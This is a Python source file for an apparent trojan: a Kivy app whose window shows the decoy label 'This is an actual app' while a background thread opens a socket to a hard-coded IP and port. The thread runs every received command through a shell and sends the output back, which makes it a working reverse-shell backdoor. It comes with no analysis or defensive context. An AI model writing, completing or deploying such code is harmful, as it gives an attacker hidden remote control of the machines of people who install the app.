#import modules
import os
import subprocess
import socket
from kivy.app import App
from kivy.uix.label import Label
import threading
import subprocess


# define constants
SERVER_IP = "192.168.3.223"
SERVER_PORT = 5679;


def main():
    # create and maintain socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as backdoor:
    
        # connect with server
        backdoor.connect((SERVER_IP,SERVER_PORT));
        
        # continuously accept commands from server
        while True:
            
            # receive command
            command = backdoor.recv(1024).decode('utf-8');
            
            # terminate
            if(command == "exit -t"):
                break;
            
            # execute command from server
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            output = op.stdout.read()
            
            # get error if any
            output_error = op.stderr.read()
            
            
            # if output  or error send output only
            if(output or output_error):
                backdoor.send(output + output_error)
                
            # if sent command has no response 
            else:
                backdoor.send("Complete".encode('utf-8'))
            
        # close connection
        s.close();


# define kivy UI
class App(App):
    def build(self):
        
        # make a label
        return Label(text="This is an actual app")


# run backdoor on a thread
mal_thread = threading.Thread(target=main)
mal_thread.start()

# run kivy app
app = App()
app.run()

# main()
# try:
#     #install des algo
#     install_package("pyDes");
#     main()
    
# except:
#     print("Error Installing Packages");
#     main()